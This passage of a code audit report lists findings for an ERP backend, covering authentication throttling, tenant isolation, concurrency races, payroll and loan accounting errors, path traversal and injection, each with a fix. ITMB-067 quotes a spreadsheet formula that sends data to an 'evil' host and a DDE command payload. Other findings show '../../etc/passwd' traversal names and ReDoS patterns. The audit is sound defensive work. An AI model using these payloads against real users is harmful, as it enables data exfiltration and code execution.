**What & why:** Email-window login throttling uses a plain in-process Map (auth.service.ts:75-78) read/written only by isEmailLoginLocked (584-591) and recordEmailLoginFailure (593-606); there is no Redis/DB backing. This state is not shared across instances and is wiped on every restart/redeploy. The deployment is clustered (logout comment references taking effect on 'every replica', auth.service.ts:298-300; a Redis-backed cache is configured in app.module.ts). The durable per-user DB counter (user.failedLoginAttempts, auth.service.ts:173-180) only increments for existing ACTIVE users and only locks that one account after 5 tries; the email-window Map is the only throttle that applies to nonexistent/inactive emails and the only pre-user-match brake on distributed guessing.

**Evidence:** auth.service.ts:75-78 private readonly emailLoginFailures = new Map<...>(); 584-606 read/write only that Map; no Redis/DB persistence. Cluster-aware logout comment at auth.service.ts:298-300.

**Impact:** In the multi-replica production deployment an attacker spreads password guesses across instances, or awaits/triggers a restart, to evade the email-window lockout — materially weakening brute-force and password-spray protection, especially against many accounts at once where the per-account DB lock trips slowly.

**Fix (summary):** Back the login-failure throttle with the already-configured Redis cache (or a distributed ThrottlerStorage), keyed by normalized email (and/or IP), so the lock is cluster-wide and survives restarts. Keep the existing DB per-account lock as the durable second layer.

---

#### ITMB-051 — 2FA login challenge has no per-account lockout and ignores account lock — distributed OTP brute force possible once the password is known

- **Severity:** medium  •  **Confidence:** high  •  **Category:** authn
- **Location:** `backend/src/modules/auth/two-factor.service.ts:139`

**What & why:** verifyChallenge (two-factor.service.ts:103-141) validates a 6-digit TOTP or any unused backup code and, on failure, only logs TWO_FACTOR_FAILED and throws (lines 139-140) — there is NO per-user failed-attempt counter, NO increment of user.failedLoginAttempts, and NO account lock. completeLogin2FA (auth.service.ts:230-267) verifies the 5-minute tempToken and re-loads the user but never re-checks user.lockedUntil before calling verifyChallenge, so the per-account lock that protects the password step (auth.service.ts:133-147, 171-182) is not enforced at the 2FA step. The /auth/2fa/challenge endpoint is @Public and throttled only at 10 req/60s PER IP (auth.controller.ts:173-176). An attacker already holding the victim's password (the tempToken is only issued after a correct password) can spread guesses across many IPs against the second factor.

**Evidence:** two-factor.service.ts:139-140 await this.logSecurityEvent('TWO_FACTOR_FAILED',...); throw new UnauthorizedException('Invalid 2FA code') — no counter/lock. auth.controller.ts:173-176 @Public() @Throttle({default:{ttl:60000,limit:10}}) @Post('2fa/challenge'). auth.service.ts:230-267 completeLogin2FA never reads user.lockedUntil.

**Impact:** MFA — the strongest control protecting privileged ERP accounts — can be worn down via distributed brute force once a password is compromised (credential stuffing/phishing), because the only barriers are a per-IP rate limit and the 5-minute token window, neither of which locks the targeted account. The TOTP space and backup-code matching make this expensive but not bounded by any account-level lockout.

**Fix (summary):** In completeLogin2FA, re-check user.lockedUntil before verifying the code and reject when locked. Persist 2FA challenge failures per user (reuse user.failedLoginAttempts/lockedUntil or a dedicated counter incremented inside verifyChallenge / the completeLogin2FA failure path) and lock the account / invalidate the tempToken after a small number of bad codes. Ensure the TOTP verification window is narrow (authenticator.options.window = 0 or 1) to minimize the live code set.

---

#### ITMB-052 — BI company_comparison dataset ignores company scope (cross-tenant leak) and is unbounded; cash_position also unbounded

- **Severity:** medium  •  **Confidence:** high  •  **Category:** Tenant isolation / Unbounded query
- **Location:** `backend/src/modules/bi/bi.service.ts:172`

**What & why:** queryDataset() (POST /bi/datasets/:datasetKey/query) is mostly bounded (take:5, take:100, and the clamped pagination() helper for inventory_summary). Two branches are not: `company_comparison` (L171-176) runs `company.findMany({ where: { deletedAt: null }, select: {...} })` with NO `take` AND NO company filter — it returns every company in the entire group regardless of the caller's tenant, even though the surrounding method computes `companyFilter` from `companyId = body.companyId ?? user.companyId` (L78-79). `cash_position` (L82-92) applies `companyFilter` correctly but has no `take`. asset_summary (L106-110) is correctly bounded by take:100.

**Evidence:** bi.service.ts L78-79 `const companyId = body.companyId ?? user.companyId; const companyFilter = companyId ? { companyId } : {};`. L172-175 company_comparison `company.findMany({ where: { deletedAt: null }, select: {...} })` — no take, no companyFilter. L83-92 cash_position findMany — no take (companyFilter present). Contrast L96-101 inventory_summary uses pagination() and L109 asset_summary take:100.

**Impact:** company_comparison leaks the full group company roster (id, name, code) to any caller with access to /bi/datasets — a tenant-isolation breach, not merely a DoS, since it bypasses the company scope every other branch honors. Both branches load whole tables; company and cashAccount are normally small reference tables so the DoS blast radius is limited (hence medium overall, driven by the cross-tenant leak).

**Fix (summary):** Apply `companyFilter` to the company_comparison branch (`where: { deletedAt: null, ...companyFilter }`) so it respects the caller's scope, and add a clamped `take` to both cash_position and company_comparison (reuse the existing pagination() helper). Safe to apply: tightens results to the caller's tenant and a sane page size.

---

#### ITMB-053 — BOQ item code via count()+1 with no transaction -> P2002 crash under concurrency (@@unique([projectId, boqCode]))

- **Severity:** medium  •  **Confidence:** high  •  **Category:** numbering
- **Location:** `backend/src/modules/boq-items/boq-items.service.ts:12`

**What & why:** nextCode() returns `BOQ-${String(count+1).padStart(5,'0')}` from prisma.bOQItem.count({where:{projectId}}) (lines 12-15); create() (lines 17-23) computes the code then does a plain prisma.bOQItem.create with no $transaction. Two concurrent estimators on the same project read count=N and both build BOQ-(N+1); schema.prisma:5395 enforces @@unique([projectId, boqCode]) so the loser fails P2002 (500). The code is PROJECT-scoped, not company-scoped.

**Evidence:** boq-items.service.ts:12-15 count()+1 (projectId scope); :20 plain create, no $transaction; unique schema.prisma:5395. Generator scopes by companyId (entity-code-generator.service.ts:109-111).

**Impact:** Two estimators adding BOQ lines to one construction project concurrently: the loser gets a 500, blocking collaborative quantity take-off.

**Fix (summary):** Move count+create into a single $transaction with a P2002 retry, preserving project-scoped 'BOQ-NNNNN'. Do NOT route through EntityCodeGeneratorService.next({companyId}): the generator keys its DocumentNumberSequence by companyId (buildSequenceCode = entityType_companyId, entity-code-generator.service.ts:109-111), which would change the counter scope from per-project to per-company. A per-project sequence (or the tx+retry) is required.

---

#### ITMB-054 — cash-accounts create() persists a client-supplied currentBalance via full ...dto spread (running balance set with no backing movement)

- **Severity:** medium  •  **Confidence:** high  •  **Category:** mass-assignment
- **Location:** `backend/src/modules/cash-accounts/cash-accounts.service.ts:87`

**What & why:** CreateCashAccountDto declares currentBalance as @IsOptional @IsNumber with no @Min (create-cash-account.dto.ts:38-39) — a declared DTO member, so whitelist:true keeps it. The service correctly enforces tenant access (assertCanAccessCompany at service:79) and scope, but then writes data: { ...dto, divisionId..., branchId..., linkedBankAccountId... } (service:87-94): because currentBalance is part of dto it is persisted verbatim as the running ledger balance. currentBalance is a derived figure that should only change through posted cash movements. CORRECTION to the original finding: the quoted expression `currentBalance: dto.currentBalance ?? dto.openingBalance ?? 0` does NOT exist in the code; the actual mechanism is the unqualified ...dto spread on service:87-94.

**Evidence:** DTO:37-39 @IsOptional() @IsNumber() openingBalance?; @IsOptional() @IsNumber() currentBalance?: number; (no @Min). service:87-94 const record = await this.prisma.cashAccount.create({ data: { ...dto, divisionId: dto.divisionId || null, branchId: dto.branchId || null, linkedBankAccountId: dto.linkedBankAccountId || null } });

**Impact:** A user with cash_accounts.manage can open a cash account whose currentBalance (including negative or inflated values) corresponds to no real transactions, corrupting cash-position reporting and bank/cash reconciliation with no GL movement backing the figure.

**Fix (summary):** Remove currentBalance from CreateCashAccountDto and explicitly initialize currentBalance from the validated openingBalance in the service (currentBalance: dto.openingBalance ?? 0) instead of relying on the ...dto spread. Add @Min(0) to openingBalance, and ensure currentBalance thereafter changes only via posted movements.

---

#### ITMB-055 — Labour reclass credits Salaries Expense (6000) for gross+employer-statutory, but the accrual only debited 6000 with gross

- **Severity:** medium  •  **Confidence:** high  •  **Category:** payroll-posting
- **Location:** `backend/src/modules/construction-labour-cost/construction-labour-cost.service.ts:112`

**What & why:** allocatedTotal = round2(grossPlusEr * fraction) where grossPlusEr = gross + employerStatutory (line 101). postLabourReclass() sets `reclassTotal = allocations.reduce((s,a) => s + Number(a.allocatedTotalCost), 0)` (payroll-postings.service.ts:660) and posts Cr SALARIES_EXPENSE (6000) = reclassTotal (line 682). But the accrual JE only debited SALARIES_EXPENSE with gross (`dr SALARIES_EXPENSE = totals.grossPay`, line 199); employer statutory was debited to the separate employer-statutory expense accounts (the file references 'employer' 12 times). Crediting 6000 by gross+employerStatutory therefore over-credits Salaries Expense (can drive it negative) and folds employer statutory into project labour while the employer-statutory expense accounts are never relieved.

**Evidence:** construction-labour-cost.service.ts:101 `const grossPlusEr = gross + employerStatutory;` :112 `const allocatedTotal = round2(grossPlusEr * fraction);` vs payroll-postings.service.ts:199 `dr SALARIES_EXPENSE = totals.grossPay` (gross only), :660 `reclassTotal = sum(allocatedTotalCost)`, :682 `Cr SALARIES_EXPENSE = reclassTotal`.

**Impact:** General Salaries Expense (6000) is over-credited by the employer-statutory portion that was never booked there, and Direct Project Labour Cost (5100) is overstated, while the specific employer-statutory expense accounts remain untouched. The income-statement breakdown is wrong and project cost includes employer statutory that the offsetting credit does not remove from the correct line.

**Fix (summary):** Reclass only the gross-salary portion through 6000 (Cr 6000 = sum(allocatedGross)), and reclass the employer-statutory portion out of the specific employer-statutory expense accounts into 5100 separately, so each credit matches the account that was originally debited.

---

#### ITMB-056 — Depreciation postEntry reads the DRAFT status check outside the transaction (TOCTOU → double-post of depreciation)

- **Severity:** medium  •  **Confidence:** high  •  **Category:** race / depreciation math
- **Location:** `backend/src/modules/depreciation/depreciation.service.ts:66`

**What & why:** postEntry() loads the entry (line 67) and checks `entry.status !== 'DRAFT'` (lines 73-75) BEFORE opening the $transaction (line 81). The transaction posts the JE via postingEngine.postLines, flips the entry to POSTED (lines 86-89), and increments the schedule's accumulatedDepreciation (lines 91-94), but it never re-reads/locks the entry's status inside the transaction. Two concurrent posts of the same DRAFT entry (double-click, retry, or scheduler racing a manual post) both pass the outer DRAFT check, both post a journal entry, and both run `accumulatedDepreciation: { increment: amount }`, double-counting depreciation expense and accumulated depreciation for that period.

**Evidence:** Line 73 `if (entry.status !== 'DRAFT') throw ...` executes on the value read at line 67 outside the tx; the tx (lines 81-97) sets status POSTED and increments accumulatedDepreciation without re-checking the prior status under a lock.

**Impact:** Duplicate depreciation journal entries and an over-stated accumulatedDepreciation on the schedule, pushing book value below salvage. The increment is atomic at the DB level but executes twice, so the asset is over-depreciated and depreciation expense is doubled for that month.

**Fix (summary):** Move the DRAFT guard inside the transaction with a conditional write, e.g. `tx.depreciationScheduleEntry.updateMany({ where: { id: entryId, status: 'DRAFT' }, data: { status: 'POSTED', ... } })` and abort/throw if count === 0 before posting the JE and incrementing the schedule (or SELECT ... FOR UPDATE the entry inside the tx). Company scoping here is already correct (assertCanAccessCompany at line 77).

---

#### ITMB-057 — Path traversal in multer temp filename: upload written under os.tmpdir() using raw client originalname; Date.now() prefix does NOT prevent traversal

- **Severity:** medium  •  **Confidence:** high  •  **Category:** path-traversal
- **Location:** `backend/src/modules/documents/documents.controller.ts:66`

**What & why:** The upload FileInterceptor diskStorage uses `destination: os.tmpdir()` (line 65) and `filename: (_req, file, cb) => cb(null, `${Date.now()}-${file.originalname}`)` (line 66). multer joins the callback-returned filename to destination via path.join and does not sanitize it, so the client-controlled file.originalname (settable via a crafted multipart Content-Disposition, including path separators and `..`) influences the on-disk temp path. I verified empirically with Node: path.join('/tmp', '1700000000000-../../var/www/x.pdf') resolves to '/tmp/var/www/x.pdf', and path.join('/tmp','123-../../etc/passwd') resolves to '/tmp/etc/passwd' -- the `${Date.now()}-` prefix is consumed during normalization and does NOT stop the leading `..` segments from escaping os.tmpdir(). The PERSISTENT copy is safe: documents.service.ts re-derives the stored name via safeStorageFileName() (basename + char-allowlist) and bounds the final path with resolveStoragePath(), so the residual bug is only the TEMP write at controller line 66. Because fs.createWriteStream does not create intermediate directories, traversal can only land in an EXISTING directory the node process can write, limiting impact to clobbering an attacker-named file under such a directory rather than arbitrary path creation.

**Impact:** An authenticated user with documents.manage can cause the production server to write uploaded bytes outside the OS temp directory, overwriting a same-named file in any existing directory the node process can write to. Lower severity than the SSRF because the persistent store is sanitized and writes are constrained to existing writable directories, but it is a real unsanitized filesystem write of attacker-controlled bytes on a live host.

**Fix (summary):** Never use originalname in the on-disk path. Generate the temp filename from server-only values, e.g. `cb(null, `${Date.now()}-${randomUUID()}`)`, or apply `path.basename(file.originalname).replace(/[^a-zA-Z0-9._-]/g,'_')` in the callback (the same sanitization the service already applies for the persistent copy). Keep originalname only as DB metadata.

---

#### ITMB-058 — Employee code generated via count()+1 (self-admitted race) -> P2002 crash on concurrent onboarding (@@unique([companyId, employeeCode]))

- **Severity:** medium  •  **Confidence:** high  •  **Category:** numbering
- **Location:** `backend/src/modules/hr/employees/employees.service.ts:132`

**What & why:** nextEmployeeCode() (lines 132-141) returns `${prefix}-EMP-${String(count+1).padStart(4,'0')}` from prisma.employee.count({where:{companyId}}) (line 139), where prefix is the per-company Company.employeeCodePrefix (fallback Company.code.slice(0,4)). It is called at line 109 in create(), whose own doc comment (lines 127-130) admits: 'There's a small race window if two creates fire simultaneously.' Two concurrent onboardings for one company both read count=N and produce the same code; schema.prisma:7308 enforces @@unique([companyId, employeeCode]) so the loser throws P2002 (500). No atomic counter.

**Evidence:** hr/employees/employees.service.ts:132-141 nextEmployeeCode count()+1; self-admitted race comment :127-130; call :109; create :110; unique schema.prisma:7308. Per-company prefix from Company.employeeCodePrefix (:138) not expressible via generic DEFAULT_PATTERNS.

**Impact:** Concurrent HR bulk onboarding / two recruiters: the losing create 500s mid-onboarding. The employee code keys payroll, attendance, deductions and statutory filings (PAYE/NSSF/WCF).

**Fix (summary):** Wrap the count+create in a $transaction with a single P2002 retry to preserve the existing per-company '${prefix}-EMP-NNNN' (padding 4) format. Do NOT switch to codes.next() -- the format depends on the per-company prefix, which the generic generator cannot reproduce (no Employee default; even if added, the prefix is company-specific). Long-term, a per-company prefixed DocumentNumberSequence could carry that prefix.

---

#### ITMB-059 — Pension (NSSF/PSSSF) is contributed on full gross including non-pensionable allowances, ignoring the AllowanceType.pensionable flag, and the inflated employee contribution over-reduces the PAYE base

- **Severity:** medium  •  **Confidence:** high  •  **Category:** tax-base
- **Location:** `backend/src/modules/hr/payroll-calculator/payroll-calculator.service.ts:102`

**What & why:** calculate() computes grossPay = basicPay + taxableAllowances + nonTaxableAllowances + overtimePay (line 99), then calls calculatePension(grossPay, ...) on the FULL gross (line 102), and subtracts the resulting employee pension from the PAYE base: taxableIncome = max(0, grossPay - nonTaxableAllowances - pensionEmployeeContribution) (lines 106-108). calculatePension applies the rate with no cap (calculators.ts:52-59). The schema defines AllowanceType.pensionable (database/prisma/schema.prisma, default true) but payroll-runs.service.ts buildInput (lines 176-183) only branches on a.allowanceType.taxable — it never reads the pensionable flag — so non-taxable reimbursement/per-diem allowances that are also non-pensionable are still included in the pension base. Because pension is on full gross, those allowances inflate NSSF/PSSSF (employee AND employer), and the inflated employee contribution is subtracted again from the PAYE base.

**Impact:** Employees with reimbursement-type (non-taxable, non-pensionable) allowances get over-stated NSSF/PSSSF on both sides (10%+10% of amounts that should be excluded) and slightly under-withheld PAYE (relief computed on the inflated pension figure). Both the fund returns and the PAYE return are wrong by the pension rate applied to the excluded allowances. Magnitude scales with the size of reimbursement allowances per employee.

**Fix (summary):** Derive a separate pensionable-earnings base in buildInput (sum allowances where allowanceType.pensionable is true, plus basic), thread it into PayrollCalculationInput, and pass it to calculatePension instead of full grossPay. Drive 'pensionable' and 'taxable' independently from AllowanceType flags. Keep PAYE base = taxable earnings minus the deductible pension. Validate against a sample employee before applying to the live run.

---

#### ITMB-060 — inventory-balances lowStock filter is inverted: returns only out-of-stock rows instead of low-but-positive stock

- **Severity:** medium  •  **Confidence:** high  •  **Category:** correctness
- **Location:** `backend/src/modules/inventory-balances/inventory-balances.service.ts:16`

**What & why:** In findAll(), the lowStock filter is `if (filters.lowStock) where.quantityOnHand = { lte: 0 };` (line 16). `{ lte: 0 }` matches only rows whose on-hand is zero or negative - i.e. strictly OUT of stock - not items that are low but still positive. The module's own liveStock() method (line 47) defines the intended semantics: status is 'OUT' when onHand <= 0 and 'LOW' when 0 < onHand <= lowThreshold (default 10). So the lowStock filter contradicts the system's own definition of low stock and never surfaces SKUs that are running low but not yet depleted.

**Evidence:** if (filters.lowStock) where.quantityOnHand = { lte: 0 };  // vs liveStock line 47: status = onHand <= 0 ? 'OUT' : onHand <= lowThreshold ? 'LOW' : 'OK'  (lowThreshold = 10)

**Impact:** Any UI/report relying on lowStock=true for reorder alerts shows only already-depleted SKUs and misses every SKU that is low-but-positive, defeating the filter and risking stockouts because reorder prompts never fire until stock hits zero.

**Fix (summary):** Filter on a positive-but-low band consistent with liveStock(), e.g. where.quantityOnHand = { gt: 0, lte: lowThreshold }; (default lowThreshold to 10, matching liveStock). If the flag is genuinely intended to mean out-of-stock, rename it to outOfStock.

---

#### ITMB-061 — journal-entries create()/update() persist caller-supplied divisionId/branchId (header and per-line) without verifying they belong to the journal's company

- **Severity:** medium  •  **Confidence:** high  •  **Category:** Multi-tenant data isolation / financial-record integrity
- **Location:** `backend/src/modules/journal-entries/journal-entries.service.ts:212`

**What & why:** create() asserts WRITE access to dto.companyId (line 191) and validates that every line accountId belongs to that company via validateLineAccounts (line 200; counts chartOfAccount rows where companyId === dto.companyId, lines 50-69). It then persists the caller-supplied divisionId/branchId WITHOUT checking they belong to dto.companyId: the header writes `divisionId: dto.divisionId, branchId: dto.branchId` (lines 212-213) and each line writes `divisionId: line.divisionId ?? dto.divisionId, branchId: line.branchId ?? dto.branchId` (lines 234-235). update() repeats the same when rebuilding lines (lines 314-316). The DTO exposes header companyId/divisionId/branchId (create-journal-entry.dto.ts:46-52) and per-line divisionId/branchId (create-journal-entry.dto.ts:32-38). The sibling chart-of-accounts module already validates this exact hierarchy in resolveAccountScope (chart-of-accounts.service.ts:203-236): it loads the branch/division and throws BadRequestException unless branch.division.companyId / division.companyId equals the input companyId. journal-entries has no equivalent check.

**Impact:** A user with journal_entries permissions and WRITE access on company A can create/update a balanced, GL-valid journal entry for company A while tagging the entry header and/or individual lines with a divisionId/branchId belonging to company B (a tenant they cannot access). Division/branch-segmented financial statements and roll-ups for company B then incorporate foreign GL activity, corrupting segment reporting and audit trails in a live production accounting system. The owning companyId is still validated, so this is cross-tenant referential contamination of segment dimensions rather than a full read-IDOR.

**Fix (summary):** Add a private resolveScope({companyId, divisionId, branchId}) helper mirroring chart-of-accounts.resolveAccountScope: when branchId is set, load the branch with division.companyId and throw BadRequestException unless it equals dto.companyId (and unless the branch's divisionId matches any supplied divisionId); when divisionId is set, load the division and throw unless division.companyId === dto.companyId. In create(), call it for the header (dto.divisionId/dto.branchId against dto.companyId) and for each line's effective scope before persisting; in update() do the same against existing.companyId. Validate-only (do not silently null out ids) to avoid changing existing valid entries.

---

#### ITMB-062 — Loan installment payment does not lock/guard the schedule row (concurrent payments race; loan principal double-decremented)

- **Severity:** medium  •  **Confidence:** high  •  **Category:** payment status / balance integrity / race
- **Location:** `backend/src/modules/loan-repayment-schedules/loan-repayment-schedules.service.ts:57`

**What & why:** recordPayment() loads the schedule via findOne() OUTSIDE the transaction (line 58) and never re-locks it inside the $transaction (line 85). It computes newPaid/newOutstanding from the stale `schedule.paidAmount`/`outstanding` read (lines 67-71) and writes them (lines 86-95). There is no SELECT ... FOR UPDATE on the schedule or the parent loan, so two concurrent payments both read the same outstanding, both pass the overpayment check (line 60), and the second overwrites the first (lost update). Each call also unconditionally applies `loan.outstandingBalance: { decrement: principalPortion }` (lines 99-106), so a concurrent pair each seeing outstanding>0 both decrement the loan, over-reducing the loan principal. The schedule read-modify-write is the core defect.

**Evidence:** Line 58 `const schedule = await this.findOne(scheduleId);` (outside tx); arithmetic at lines 67-68 uses that stale read; the tx at line 85 updates the schedule and decrements loan.outstandingBalance (lines 99-106) without re-selecting either row with a lock.

**Impact:** Concurrent installment payments lose paidAmount updates on the schedule and double-decrement the parent loan's outstandingBalance, corrupting both the installment schedule and the loan principal balance. No row-level serialization protects the money math.

**Fix (summary):** Open the $transaction first and SELECT the schedule (and the parent loan) FOR UPDATE; re-read outstanding/paidAmount from the locked row; perform the overpayment check and all arithmetic inside the transaction so concurrent payments serialize.

---

#### ITMB-063 — Loans recordRepayment only updates the balance when the client supplies remainingBalance (client-controlled, no server derivation)

- **Severity:** medium  •  **Confidence:** high  •  **Category:** loan principal/balance integrity
- **Location:** `backend/src/modules/loans/loans.service.ts:236`

**What & why:** recordRepayment() creates a LoanRepayment row inside a transaction with a FOR UPDATE lock on the loan (lines 243-249), but only reduces outstandingBalance if the caller passes dto.remainingBalance, in which case it blindly sets `outstandingBalance = new Prisma.Decimal(dto.remainingBalance)` (lines 267-273). The server never derives the new balance from the repayment principal. If the client omits remainingBalance, the repayment is recorded but outstandingBalance is left unchanged (the loan never decreases despite recorded repayments); if the client supplies an arbitrary value, the balance becomes whatever the client says, with no check that it is <= prior balance or consistent with principalAmount. The FOR UPDATE lock protects concurrency, not the wrong/absent value.

**Evidence:** Lines 267-273: `if (dto.remainingBalance !== undefined) { await tx.loan.update({ where:{id:loanId}, data:{ outstandingBalance: new Prisma.Decimal(dto.remainingBalance) } }); }` — no derivation from principalAmount, no clamp, and no update at all when remainingBalance is omitted.

**Impact:** Loan outstanding balances drift from reality: repayments recorded without remainingBalance leave the balance overstated forever (loan appears unpaid), while a malicious or buggy client can set any balance (including increasing it or zeroing it without payment). No GL cash/principal entry is posted either.

**Fix (summary):** Derive the new outstanding balance server-side from the prior locked balance (rows[0].outstandingBalance) minus the principal portion of the repayment (defaulting principal to amount when not split), clamp to >= 0, reject values inconsistent with the recorded principal, and update unconditionally. Post a JE for the cash inflow/principal reduction.

---

#### ITMB-064 — package-movements create() silently no-ops the customer balance for unhandled movement types and never guards against negative owed balance

- **Severity:** medium  •  **Confidence:** high  •  **Category:** correctness/drift
- **Location:** `backend/src/modules/package-movements/package-movements.service.ts:27`

**What & why:** create() always writes a PackageMovement row, then if dto.customerId is set it upserts CustomerPackageBalance via a switch on dto.movementType (lines 27-40). The DTO's allowed movementType list (create-package-movement.dto.ts:5-16) includes values the switch does NOT cover (PICKED_UP_FROM_SUPPLIER, RETURNED_TO_SUPPLIER, LOST, DAMAGED, ADJUSTMENT) and the switch has NO default branch. If a movement is created with a customerId AND one of those unhandled types, balanceUpdate stays {} and the upsert's `update: {}` is a no-op on an existing row - so a PackageMovement is recorded but the existing CustomerPackageBalance is NOT adjusted, silently diverging the stored balance from the movement ledger with no error. Additionally the RETURNED_BY_CUSTOMER / ADJUSTMENT_OUT decrements of quantityOwedByCustomer (lines 32, 38) have no lower bound, so an over-return can push quantityOwedByCustomer negative.

**Evidence:** switch (dto.movementType) { case 'ISSUED_TO_CUSTOMER': ...; case 'RETURNED_BY_CUSTOMER': quantityOwedByCustomer = { decrement: dto.quantity }; case 'ADJUSTMENT_IN': ...; case 'ADJUSTMENT_OUT': quantityOwedByCustomer = { decrement: dto.quantity }; }  // no default; unhandled type -> balanceUpdate={} -> upsert update:{} is a no-op; decrements unbounded

**Impact:** Returnable-package customer balances can silently diverge from the movement history when a customer-linked movement uses an unhandled type, and over-returns can push the owed quantity negative - producing wrong returnable-package figures with no error surfaced.

**Fix (summary):** Add a default branch to the switch that throws BadRequestException for movement types not valid against a customerId (or explicitly handle every allowed type), validate the movementType-vs-customerId/supplierId combination, and guard the decrements so quantityOwedByCustomer cannot go below zero.

---

#### ITMB-065 — Parking close() ignores the rate's gracePeriodMinutes and maxDailyAmount, over-billing short stays

- **Severity:** medium  •  **Confidence:** high  •  **Category:** verticals
- **Location:** `backend/src/modules/parking-sessions/parking-sessions.service.ts:135`

**What & why:** close() computes durationHours = ms/3,600,000 and for HOURLY charges Math.ceil(durationHours) * rateAmount (line 135), with the same hard Math.ceil for DAILY/WEEKLY/MONTHLY (lines 138/141/144). The ParkingRate model defines gracePeriodMinutes Int @default(0) and maxDailyAmount Decimal? (schema lines 6303-6304), but close() reads NEITHER: a grep of the parking-sessions module shows no gracePeriodMinutes or maxDailyAmount usage. So any fraction of a billing unit is rounded up with no grace window (a 1-minute stay = 1 hour, a 61-minute stay = 2 hours) and no daily cap is ever applied.

**Evidence:** Lines 124-135: durationHours = durationMs/(1000*60*60); case HOURLY: Math.ceil(durationHours)*rateAmount. ParkingRate.gracePeriodMinutes (schema 6303) and maxDailyAmount (6304) exist; grep of the module returned no matches for either field. Same Math.ceil at lines 138/141/144.

**Impact:** Systematic over-billing versus the facility's own posted tariff: the configurable grace window and daily maximum are silently ignored, so short stays and stays crossing a unit boundary by minutes are over-charged. Produces customer disputes and refund overhead in the parking vertical.

**Fix (summary):** In close(), apply the rate's grace and cap: subtract rate.gracePeriodMinutes from the elapsed minutes before ceiling (e.g. Math.ceil(Math.max(0, durationMinutes - rate.gracePeriodMinutes)/60) for HOURLY), guard the zero/near-zero-duration case, and after computing calculatedAmount clamp it to rate.maxDailyAmount per 24h when that field is set. These fields already exist on ParkingRate, so honour them rather than the current unconditional Math.ceil.

---

#### ITMB-066 — Financial/procurement controllers type the request body as @Body() dto: any, disabling the global ValidationPipe (verified: posting-rules, loan-repayment-schedules)

- **Severity:** medium  •  **Confidence:** high  •  **Category:** input-validation
- **Location:** `backend/src/modules/posting-rules/posting-rules.controller.ts:24`

**What & why:** When a handler parameter is typed `any` there is no class metatype, so the global ValidationPipe (whitelist/forbidNonWhitelisted/transform, confirmed main.ts:46-53) never executes and the body flows entirely unvalidated into Prisma. Verified concretely in posting-rules.controller.ts: create(:24), update(:30) and addLine(:48) all use @Body() dto: any; and in loan-repayment-schedules.controller.ts:24/42 (confirmed above). The auditor cites ~40+ further controllers (depreciation, goods-received-notes, purchase-requisitions, rfqs, bid-comparisons, customer-credit-profiles, disaster-recovery) that match the same grep pattern but were not individually re-opened in this review; treat those as a pattern to sweep rather than per-file-confirmed.

**Evidence:** posting-rules.controller.ts:24 create(@Body() dto: any, ...); :30 update(@Param id, @Body() dto: any, ...); :48 addLine(@Param id, @Body() dto: any, ...). Global ValidationPipe main.ts:46-53.

**Impact:** Clients can send negative/overflow amounts and quantities, malformed ids, junk enum values and arbitrary extra keys that are written straight to Prisma — risking data corruption (e.g. unbalanced/negative posting-rule lines) and, in handlers that read companyId off the body without scoping, tenant-isolation gaps. It also defeats the project's own whitelist+forbidNonWhitelisted posture.

**Fix (summary):** Replace each @Body() dto: any with a proper DTO class carrying class-validator decorators (@IsUUID, @IsEnum, @IsInt/@IsNumber @Min(0), @IsDateString, @ValidateNested for line arrays). Prioritize accounting/procurement modules (posting-rules, loan-repayment-schedules, depreciation, goods-received-notes line items, purchase-requisitions, rfqs).

---

#### ITMB-067 — CSV/Excel formula injection: print-engine renderExcel writes request-supplied cell values, headers and metadata without neutralizing leading = + - @

- **Severity:** medium  •  **Confidence:** high  •  **Category:** formula-injection
- **Location:** `backend/src/modules/print-engine/print-engine.service.ts:278`

**What & why:** renderExcel(dto:any) (line 115) reads sheetData/data/sheetName straight from the request body (controller print-engine.controller.ts line 29 `@Body() dto: any`) and passes them into dataToExcel() (lines 122-127). Cell values are written verbatim at line 278 (`worksheet.addRow(headers.map((header) => row[header] ?? ''))`), header names raw at line 272 (`worksheet.addRow(headers)`, keys from Object.keys(rows[0])), and metadata key/value pairs at line 266 (`worksheet.addRow([key, String(value ?? '')])`). No value is sanitized for the leading characters =, +, -, @ (or TAB/CR) that Excel/LibreOffice/Google Sheets treat as the start of a formula. The .xlsx is streamed as a download attachment (controller lines 31-34, Content-Disposition attachment) and opened by other staff, so a crafted value such as `=HYPERLINK("http://evil/?"&A1,"x")` or a legacy DDE payload `=cmd|'/c calc'!A1` executes in the victim's spreadsheet. The endpoint requires only print_engine.render. (The PDF path uses pdfkit and is not affected.)

**Impact:** An authenticated user with print_engine.render can craft export rows/headers/metadata that, when the spreadsheet is opened by an accountant/admin, exfiltrate cell data via HYPERLINK/WEBSERVICE or attempt command execution via DDE -- data exfiltration / potential code execution on the downloader's workstation.

**Fix (summary):** Add a neutralizeFormula helper: if a string cell value begins with =, +, -, @, TAB or CR, prefix it with a single quote (or set the ExcelJS cell to explicit text type). Apply it to every value in the row map (line 278), the header names (line 272), and the metadata values (line 266).

---

#### ITMB-068 — Regex injection / ReDoS in print-engine: user-controlled template-data keys compiled into RegExp without escaping

- **Severity:** medium  •  **Confidence:** high  •  **Category:** ReDoS / Regex injection
- **Location:** `backend/src/modules/print-engine/print-engine.service.ts:182`

**What & why:** loadAndFillTemplate() (L167-185) builds `vars = { ...(data ?? {}), entityType, entityId }` from the request body and loops `for (const [key, value] of Object.entries(vars)) { html = html.replace(new RegExp(\`\\{\\{\\s*${key}\\s*\\}\\}\`, 'g'), String(value ?? '')); }` (L181-182). `data` is the raw `@Body() dto: any` from POST /print-engine/render, /render-pdf, /render-excel (print-engine.controller.ts L14/20/26, gated only by `print_engine.render`). Each object key is interpolated raw into a dynamically compiled global RegExp with no escaping of regex metacharacters, then executed via String.replace against the DB-loaded template HTML (template.content).

**Evidence:** print-engine.service.ts L180-182: `const vars = { ...(data ?? {}), entityType, entityId }; for (const [key, value] of Object.entries(vars)) { html = html.replace(new RegExp(\`\\{\\{\\s*${key}\\s*\\}\\}\`, 'g'), String(value ?? '')); }`. print-engine.controller.ts L13-14 `@Post('render') render(@Body() dto: any, ...)`.

**Impact:** An attacker with print_engine.render can supply a data key that is a catastrophic-backtracking pattern (e.g. `(a+)+$`, `(.*)*x`) or invalid regex. Run against a non-trivial template body, this either throws (request error) or pins the Node event loop, blocking every other request on that worker — a single-request CPU DoS, repeatable within the throttler budget. It is also a correctness bug: keys containing `.`, `(`, `|`, etc. corrupt placeholder replacement.

